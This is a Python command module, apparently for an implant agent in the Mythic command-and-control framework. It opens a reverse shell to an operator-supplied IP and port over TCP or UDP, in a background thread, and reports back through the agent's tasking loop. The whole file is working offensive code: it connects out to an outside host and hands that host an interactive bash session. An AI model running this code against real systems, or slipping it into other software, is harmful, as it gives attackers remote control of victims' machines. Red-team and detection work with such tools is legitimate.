import socket
import subprocess
import threading
import select
import json


# Spawns an interactive bash shell connected to the listener via TCP.
# The socket is passed directly as stdin/stdout/stderr to Popen.
def _tcp_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    proc = subprocess.Popen(
        ["/bin/bash", "-i"],
        stdin=s, stdout=s, stderr=s
    )
    proc.wait()
    s.close()


# Spawns an interactive bash shell over UDP. Since UDP is connectionless it
# can't be dup2'd directly — a sender thread shuttles proc stdout to the socket
# while the main loop reads incoming UDP and writes to proc stdin.
def _udp_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b"\n", (ip, port))  # initial packet so the listener knows we're here
    proc = subprocess.Popen(
        ["/bin/bash", "-i"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    def _send():
        while True:
            data = proc.stdout.read(1024)
            if not data:
                break
            s.sendto(data, (ip, port))

    threading.Thread(target=_send, daemon=True).start()

    while proc.poll() is None:
        r, _, _ = select.select([s], [], [], 1.0)
        if r:
            data, _ = s.recvfrom(4096)
            proc.stdin.write(data)
            proc.stdin.flush()

    s.close()


# Starts the reverse shell in a daemon thread so the Mythic tasking loop
# continues unblocked. Posts a confirmation immediately and returns None.
def execute(params, task_id, callback_id):
    import agent  # deferred to avoid circular import — agent.py imports this module
    try:
        parsed   = json.loads(params)
        ip       = parsed.get("ip", "").strip()
        port     = int(parsed.get("port", 0))
        protocol = parsed.get("protocol", "TCP").upper()
    except Exception:
        agent.post_response(callback_id, task_id, "connect: invalid parameters")
        return None

    if not ip or not port:
        agent.post_response(callback_id, task_id, "connect: ip and port are required")
        return None

    target = _tcp_shell if protocol == "TCP" else _udp_shell
    threading.Thread(target=target, args=(ip, port), daemon=True).start()
    agent.post_response(callback_id, task_id,
        f"reverse shell started -> {ip}:{port} ({protocol})")
    return None  # always — this command manages all its own posts
